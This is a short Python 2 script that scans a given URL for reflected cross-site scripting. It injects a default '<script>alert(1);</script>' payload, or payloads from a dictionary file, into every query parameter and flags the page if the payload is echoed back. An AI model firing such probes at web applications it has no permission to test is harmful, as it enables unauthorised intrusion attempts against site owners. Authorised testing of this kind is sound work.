#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# by @aetsu
#
# Use: xssUrl.py url <payloads dictionary>
#

import requests
import urlparse
import sys


url = sys.argv[1]

if len(sys.argv) < 3:
    payloads = ['<script>alert(1);</script>']
else:
    filename = sys.argv[2]
    payloads = [line.rstrip('\n') for line in open(filename)]


parsed = urlparse.urlparse(url)
parameters = urlparse.parse_qs(parsed.query)
newurl = urlparse.urljoin(parsed.scheme + "://" + parsed.netloc, parsed.path)

print ""
print "Url : " + url

for payload in payloads:
    for p in parameters:
        parameters[p] = payload

    try:
        req = requests.get(newurl, params=parameters)
        if payload in req.text:
            print "The url " + url
            print "is possibly vulnerable!"
            print "Payload: " + payload
            break

    except:
        print "Error opening " + url
        break

print ""
